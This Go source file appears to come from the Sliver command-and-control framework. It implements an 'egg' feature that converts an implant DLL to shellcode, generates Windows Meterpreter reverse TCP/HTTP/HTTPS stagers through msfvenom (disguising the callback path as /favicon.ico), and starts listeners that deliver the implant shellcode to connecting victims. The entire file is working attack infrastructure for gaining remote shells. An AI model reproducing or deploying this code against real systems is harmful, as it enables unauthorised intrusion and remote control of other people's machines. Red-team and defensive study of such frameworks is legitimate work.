package rpc

import (
	"fmt"
	consts "sliver/client/constants"
	clientpb "sliver/protobuf/client"
	"sliver/server/c2"
	"sliver/server/core"
	"sliver/server/generate"
	"sliver/server/msf"
	"sync"

	"github.com/golang/protobuf/proto"
)

func rpcEgg(data []byte, resp RPCResponse) {
	var jobID int
	eggReq := &clientpb.EggRequest{}
	err := proto.Unmarshal(data, eggReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	// Create sRDI shellcode
	config := generate.SliverConfigFromProtobuf(eggReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliverShellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	// Create stager shellcode
	filename := fmt.Sprintf("%s_egg.bin", config.Name)
	stage, err := generateMsfStage(eggReq.EConfig)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	// Start c2 listener
	switch eggReq.EConfig.Protocol {
	case clientpb.EggConfig_TCP:
		jobID, err = jobStartEggTCPListener(eggReq.EConfig.Host, uint16(eggReq.EConfig.Port), sliverShellcode)
		if err != nil {
			resp([]byte{}, err)
			return
		}
	case clientpb.EggConfig_HTTP:
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", eggReq.EConfig.Host, eggReq.EConfig.Port),
			LPort:  uint16(eggReq.EConfig.Port),
			Domain: eggReq.EConfig.Host,
			Secure: false,
			ACME:   false,
		}
		job := jobStartEggHTTPListener(conf, sliverShellcode)
		jobID = job.ID
	case clientpb.EggConfig_HTTPS:
		conf := &c2.HTTPServerConfig{
			Addr:   fmt.Sprintf("%s:%d", eggReq.EConfig.Host, eggReq.EConfig.Port),
			LPort:  uint16(eggReq.EConfig.Port),
			Domain: eggReq.EConfig.Host,
			Secure: true,
			ACME:   false,
		}
		job := jobStartEggHTTPListener(conf, sliverShellcode)
		jobID = job.ID
	default:
		resp([]byte{}, fmt.Errorf("Not supported"))
		return
	}
	// Send back response
	data, err = proto.Marshal(&clientpb.Egg{
		JobID:    int32(jobID),
		Filename: filename,
		Data:     stage,
	})
	resp(data, err)
}

func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
	var (
		stage   []byte
		payload string
		options []string
	)
	switch config.Protocol {
	case clientpb.EggConfig_TCP:
		payload = "meterpreter/reverse_tcp"
	case clientpb.EggConfig_HTTP:
		payload = "meterpreter/reverse_http"
		options = append(options, "LURI=/favicon.ico")
	case clientpb.EggConfig_HTTPS:
		payload = "meterpreter/reverse_https"
		options = append(options, "LURI=/favicon.ico")
	default:
		return stage, fmt.Errorf("Protocol not supported")
	}

	venomConfig := msf.VenomConfig{
		Os:      "windows",
		Payload: payload,
		LHost:   config.Host,
		LPort:   uint16(config.Port),
		Arch:    config.Arch,
		Options: options,
		// TODO: add an encoder if required
	}
	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return stage, err
	}
	return stage, nil
}

func jobStartEggTCPListener(bindIface string, port uint16, shellcode []byte) (int, error) {
	ln, err := c2.StartTCPListener(bindIface, port, shellcode)
	if err != nil {
		return -1, err // If we fail to bind don't setup the Job
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "TCP",
		Description: "Raw TCP listener (egg only)",
		Protocol:    "tcp",
		Port:        port,
		JobCtrl:     make(chan bool),
	}

	go func() {
		<-job.JobCtrl
		rpcLog.Infof("Stopping TCP listener (%d) ...", job.ID)
		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections

		core.Jobs.RemoveJob(job)

		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
		})
	}()

	core.Jobs.AddJob(job)

	return job.ID, nil
}

func jobStartEggHTTPListener(conf *c2.HTTPServerConfig, data []byte) *core.Job {
	server := c2.StartHTTPSListener(conf)
	name := "http"
	if conf.Secure {
		name = "https"
	}
	server.SliverShellcode = data
	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        name,
		Description: fmt.Sprintf("%s for domain %s", name, conf.Domain),
		Protocol:    "tcp",
		Port:        uint16(conf.LPort),
		JobCtrl:     make(chan bool),
	}
	core.Jobs.AddJob(job)

	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		var err error
		if server.Conf.Secure {
			if server.Conf.ACME {
				err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
			} else {
				err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
			}
		} else {
			err = server.HTTPServer.ListenAndServe()
		}
		if err != nil {
			rpcLog.Errorf("%s listener error %v", name, err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}
	}()

	go func() {
		<-job.JobCtrl
		once.Do(func() { cleanup(nil) })
	}()

	return job
}
